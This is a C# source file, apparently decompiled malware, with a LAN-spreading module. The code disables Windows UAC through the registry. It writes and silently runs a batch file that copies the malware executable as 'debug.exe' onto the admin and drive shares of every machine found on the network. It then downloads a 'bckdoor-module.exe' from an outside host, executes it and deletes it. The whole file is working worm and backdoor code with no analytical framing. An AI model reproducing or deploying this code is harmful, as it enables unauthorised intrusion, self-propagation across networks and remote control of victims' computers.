using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace MI_CSRSS;

internal class cLANSpread
{
	public static void UAC()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			string text = registryKey.GetValue("EnableLUA")!.ToString();
			if (text == "1")
			{
				registryKey.SetValue("EnableLUA", "0");
			}
		}
		catch
		{
		}
	}

	public static void loadLAN()
	{
		StreamWriter streamWriter = new StreamWriter("share.bat");
		streamWriter.WriteLine("@echo off & break off");
		streamWriter.WriteLine("net view >log.txt");
		streamWriter.WriteLine("for /f %%t in (log.txt) do ( ");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\IPC$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\ADMIN$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\C$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\D$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\PRINT$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\e$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\e$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\d$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" %%t\\C$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + Environment.GetEnvironmentVariable("appdata") + "\\" + Config.id + ".exe\" shared\\debug.exe");
		streamWriter.WriteLine(")");
		streamWriter.Close();
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = "share.bat";
		process.Start();
		LanModule();
	}

	public static void LanModule()
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile("http://amadox.nl/tbp/modules/bckdoor-module.exe", Path.GetTempPath() + "LanModule.exe");
			Process.Start(Path.GetTempPath() + "LanModule.exe");
			File.Delete(Path.GetTempPath() + "LanModule.exe");
		}
		catch
		{
		}
	}
}
